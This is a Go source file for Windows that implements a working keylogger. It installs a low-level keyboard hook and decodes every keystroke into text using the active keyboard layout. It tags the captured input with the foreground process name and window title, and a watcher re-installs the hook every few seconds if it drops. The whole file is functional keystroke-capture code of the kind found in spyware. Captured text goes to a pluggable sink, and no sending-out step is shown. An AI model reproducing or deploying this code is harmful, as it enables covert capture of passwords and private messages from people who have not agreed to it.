//go:build windows

package win32

import (
	"context"
	"fmt"
	"log/slog"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
	"unicode/utf16"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	whKeyboardLL  = 13
	wmKeyDown     = 0x0100
	wmKeyUp       = 0x0101
	wmSysKeyDown  = 0x0104
	wmSysKeyUp    = 0x0105
	wmQuit        = 0x0012
	hcAction      = 0
	cfUnicodeText = 13

	foregroundPoll = 500 * time.Millisecond

	hookHealth = 3 * time.Second

	vkBack    = 0x08
	vkTab     = 0x09
	vkReturn  = 0x0D
	vkShift   = 0x10
	vkControl = 0x11
	vkMenu    = 0x12
	vkCapital = 0x14
	vkEscape  = 0x1B
	vkLWin    = 0x5B
	vkRWin    = 0x5C
)

var modifierVKs = [...]uint32{
	0x10, 0xA0, 0xA1,
	0x11, 0xA2, 0xA3,
	0x12, 0xA4, 0xA5,
}

var (
	procSetWindowsHookExW        = user32.NewProc("SetWindowsHookExW")
	procUnhookWindowsHookEx      = user32.NewProc("UnhookWindowsHookEx")
	procCallNextHookEx           = user32.NewProc("CallNextHookEx")
	procGetMessageW              = user32.NewProc("GetMessageW")
	procTranslateMessage         = user32.NewProc("TranslateMessage")
	procDispatchMessageW         = user32.NewProc("DispatchMessageW")
	procPostThreadMessageW       = user32.NewProc("PostThreadMessageW")
	procGetKeyboardState         = user32.NewProc("GetKeyboardState")
	procToUnicodeEx              = user32.NewProc("ToUnicodeEx")
	procGetForegroundWindow      = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW           = user32.NewProc("GetWindowTextW")
	procGetWindowThreadProcessID = user32.NewProc("GetWindowThreadProcessId")
	procGetKeyboardLayout        = user32.NewProc("GetKeyboardLayout")
	procGetAsyncKeyState         = user32.NewProc("GetAsyncKeyState")
	procAttachThreadInput        = user32.NewProc("AttachThreadInput")
)

type KeyEvent struct {
	Timestamp time.Time
	Vk        uint32
	Rune      rune
	IsSpecial bool
	Label     string
}

type WindowSession struct {
	StartedAt   time.Time
	ProcessName string
	WindowTitle string
	Events      []KeyEvent
}

type Sink interface {
	StartSession(process, title string, at time.Time)
	Append(ev KeyEvent)
}

type point struct {
	X int32
	Y int32
}

type msg struct {
	Hwnd     uintptr
	Message  uint32
	WParam   uintptr
	LParam   uintptr
	Time     uint32
	Pt       point
	LPrivate uint32
}

type kbdllHookStruct struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

type windowInfo struct {
	process string
	title   string
}

type Keylogger struct {
	mu       sync.Mutex
	sink     Sink
	hook     uintptr
	threadID uint32
	layout   uintptr
	caps     bool
	window   windowInfo
	running  bool
	wanted   bool
	done     chan struct{}
	cancel   context.CancelFunc
	wg       sync.WaitGroup
}

var Default = &Keylogger{}

var hookProcRef = windows.NewCallback(keyboardProc)

func (k *Keylogger) SetSink(sink Sink) {
	k.mu.Lock()
	k.sink = sink
	k.mu.Unlock()
}

func keyboardProc(nCode int32, wParam uintptr, lParam uintptr) uintptr {
	if nCode == hcAction && (wParam == wmKeyDown || wParam == wmSysKeyDown) {
		kb := (*kbdllHookStruct)(uintptrToPointer(lParam))
		Default.record(kb)
	}
	res, _, _ := procCallNextHookEx.Call(0, uintptr(nCode), wParam, lParam)
	return res
}

func (k *Keylogger) record(kb *kbdllHookStruct) {
	k.mu.Lock()
	sink := k.sink
	k.mu.Unlock()
	if sink == nil {
		return
	}

	if suppressKey() {
		return
	}

	if kb.VkCode == vkCapital {
		k.mu.Lock()
		k.caps = !k.caps
		k.mu.Unlock()
		return
	}

	switch kb.VkCode {
	case vkBack:
		sink.Append(KeyEvent{Timestamp: time.Now().UTC(), Vk: vkBack, IsSpecial: true})
		return
	case vkReturn:
		sink.Append(KeyEvent{Timestamp: time.Now().UTC(), Vk: vkReturn, Rune: '\n'})
		return
	}

	if silentKey(kb.VkCode) {
		return
	}

	text, ok := k.decode(kb)
	if !ok || text == "" {
		return
	}
	at := time.Now().UTC()
	for _, r := range text {
		if r == '\r' || r == '\n' || r == '\t' {
			continue
		}
		sink.Append(KeyEvent{Timestamp: at, Vk: kb.VkCode, Rune: r})
	}
}

func (k *Keylogger) decode(kb *kbdllHookStruct) (string, bool) {
	k.mu.Lock()
	layout := k.layout
	caps := k.caps
	k.mu.Unlock()

	var state [256]byte
	if res, _, _ := procGetKeyboardState.Call(uintptr(unsafe.Pointer(&state[0]))); res == 0 {
		return "", false
	}
	fillModifierState(&state, caps)

	var buf [8]uint16
	n, _, _ := procToUnicodeEx.Call(
		uintptr(kb.VkCode),
		uintptr(kb.ScanCode),
		uintptr(unsafe.Pointer(&state[0])),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		0,
		layout,
	)
	if int32(n) <= 0 {
		return "", false
	}

	units := buf[:n]
	text := string(utf16.Decode(units))
	return text, text != ""
}

func fillModifierState(state *[256]byte, caps bool) {
	for _, vk := range modifierVKs {
		state[vk] &^= 0x81
	}
	state[vkCapital] &^= 0x81

	shift := false
	control := false
	alt := false
	for _, vk := range []uint32{0x10, 0xA0, 0xA1} {
		res, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
		if int32(res)&0x8000 != 0 {
			shift = true
		}
	}
	for _, vk := range []uint32{0x11, 0xA2, 0xA3} {
		res, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
		if int32(res)&0x8000 != 0 {
			control = true
		}
	}
	for _, vk := range []uint32{0x12, 0xA4, 0xA5} {
		res, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
		if int32(res)&0x8000 != 0 {
			alt = true
		}
	}

	if shift {
		state[0x10] |= 0x80
	}
	if control {
		state[0x11] |= 0x80
	}
	if alt {
		state[0x12] |= 0x80
	}
	if caps {
		state[vkCapital] |= 0x01
	}
}

func suppressKey() bool {
	if down(0x5B) || down(0x5C) {
		return true
	}
	if down(0xA5) {
		return false
	}
	return down(0x11) || down(0xA2) || down(0xA3) || down(0x12) || down(0xA4)
}

func down(vk uint32) bool {
	res, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
	return int32(res)&0x8000 != 0
}

func silentKey(vk uint32) bool {
	switch vk {
	case vkShift, 0xA0, 0xA1,
		vkControl, 0xA2, 0xA3,
		vkMenu, 0xA4, 0xA5,
		vkCapital,
		vkTab, vkEscape,
		vkLWin, vkRWin, 0x5D,
		0x25, 0x26, 0x27, 0x28,
		0x24, 0x23, 0x21, 0x22,
		0x2D, 0x2E, 0x2C, 0x13,
		0x90, 0x91,
		0xAD, 0xAE, 0xAF:
		return true
	}
	if vk >= 0x70 && vk <= 0x87 {
		return true
	}
	return vk >= 0xA6 && vk <= 0xB7
}

func (k *Keylogger) Start() error {
	k.mu.Lock()
	if k.running {
		k.wanted = true
		k.mu.Unlock()
		return nil
	}
	k.wanted = true
	ctx, cancel := context.WithCancel(context.Background())
	k.cancel = cancel
	k.mu.Unlock()

	k.wg.Add(1)
	go func() {
		defer k.wg.Done()
		k.watch(ctx)
	}()

	return k.install()
}

func (k *Keylogger) Stop() {
	k.mu.Lock()
	k.wanted = false
	cancel := k.cancel
	k.cancel = nil
	running, tid, done := k.running, k.threadID, k.done
	k.mu.Unlock()

	if cancel != nil {
		cancel()
	}

	if running && done != nil {
		procPostThreadMessageW.Call(uintptr(tid), wmQuit, 0, 0)
		select {
		case <-done:
		case <-time.After(2 * time.Second):
			slog.Debug("keylogger: el message loop no cerró a tiempo")
		}
	}

	waited := make(chan struct{})
	go func() {
		k.wg.Wait()
		close(waited)
	}()
	select {
	case <-waited:
	case <-time.After(time.Second):
		slog.Debug("keylogger: el vigilante no cerró a tiempo")
	}
}

func (k *Keylogger) Running() bool {
	k.mu.Lock()
	defer k.mu.Unlock()
	return k.running
}

func (k *Keylogger) watch(ctx context.Context) {
	ticker := time.NewTicker(foregroundPoll)
	defer ticker.Stop()

	lastHealth := time.Time{}
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
		}

		k.syncForeground()

		if time.Since(lastHealth) < hookHealth {
			continue
		}
		lastHealth = time.Now()

		k.mu.Lock()
		wanted, running := k.wanted, k.running
		k.mu.Unlock()
		if wanted && !running {
			if err := k.install(); err != nil {
				slog.Debug("keylogger: rearme fallido", "err", err)
			}
		}
	}
}

func (k *Keylogger) syncForeground() {
	hwnd, _, _ := procGetForegroundWindow.Call()
	if hwnd == 0 {
		return
	}

	var titleBuf [512]uint16
	var title string
	if n, _, _ := procGetWindowTextW.Call(
		hwnd,
		uintptr(unsafe.Pointer(&titleBuf[0])),
		uintptr(len(titleBuf)),
	); n > 0 && int(n) <= len(titleBuf) {
		title = string(utf16.Decode(titleBuf[:n]))
	}

	var pid uint32
	threadID, _, _ := procGetWindowThreadProcessID.Call(
		hwnd, uintptr(unsafe.Pointer(&pid)))

	process := ""
	if handle, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid); err == nil {
		var path [windows.MAX_LONG_PATH]uint16
		size := uint32(len(path))
		if qerr := windows.QueryFullProcessImageName(handle, 0, &path[0], &size); qerr == nil && size > 0 {
			process = filepath.Base(windows.UTF16ToString(path[:size]))
		}
		_ = windows.CloseHandle(handle)
	}

	var layout uintptr
	if threadID != 0 {
		layout, _, _ = procGetKeyboardLayout.Call(threadID)
	}

	if process == "" && title == "" {
		return
	}

	k.mu.Lock()
	k.layout = layout
	changed := process != k.window.process || !sameWindowTitle(title, k.window.title)
	k.window = windowInfo{process: process, title: title}
	sink := k.sink
	k.mu.Unlock()

	if changed && sink != nil {
		sink.StartSession(process, title, time.Now().UTC())
	}
}

func sameWindowTitle(a, b string) bool {
	if a == b {
		return true
	}
	return strings.TrimPrefix(a, "*") == strings.TrimPrefix(b, "*")
}

func initCapsLock() bool {
	myTid := uintptr(windows.GetCurrentThreadId())
	var target uintptr
	attached := false

	if hwnd, _, _ := procGetForegroundWindow.Call(); hwnd != 0 {
		var pid uint32
		tid, _, _ := procGetWindowThreadProcessID.Call(hwnd, uintptr(unsafe.Pointer(&pid)))
		target = tid
		if target != 0 && target != myTid {
			if res, _, _ := procAttachThreadInput.Call(myTid, target, 1); res != 0 {
				attached = true
			}
		}
	}
	if attached {
		defer func() { _, _, _ = procAttachThreadInput.Call(myTid, target, 0) }()
	}

	var state [256]byte
	if res, _, _ := procGetKeyboardState.Call(uintptr(unsafe.Pointer(&state[0]))); res == 0 {
		return false
	}
	return state[vkCapital]&0x01 != 0
}

func (k *Keylogger) install() error {
	ready := make(chan error, 1)

	go func() {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()

		hook, _, callErr := procSetWindowsHookExW.Call(whKeyboardLL, hookProcRef, 0, 0)
		if hook == 0 {
			ready <- fmt.Errorf("keylogger: SetWindowsHookExW falló: %v", callErr)
			return
		}

		done := make(chan struct{})
		caps := initCapsLock()

		k.mu.Lock()
		k.hook = hook
		k.threadID = windows.GetCurrentThreadId()
		k.caps = caps
		k.running = true
		k.done = done
		wanted := k.wanted
		k.mu.Unlock()

		ready <- nil

		if !wanted {
			procPostThreadMessageW.Call(uintptr(windows.GetCurrentThreadId()), wmQuit, 0, 0)
		}

		var m msg
		for {
			res, _, _ := procGetMessageW.Call(uintptr(unsafe.Pointer(&m)), 0, 0, 0)
			if int32(res) <= 0 {
				break
			}
			procTranslateMessage.Call(uintptr(unsafe.Pointer(&m)))
			procDispatchMessageW.Call(uintptr(unsafe.Pointer(&m)))
		}

		procUnhookWindowsHookEx.Call(hook)
		k.mu.Lock()
		k.running = false
		k.hook = 0
		k.threadID = 0
		k.mu.Unlock()
		close(done)
	}()

	return <-ready
}
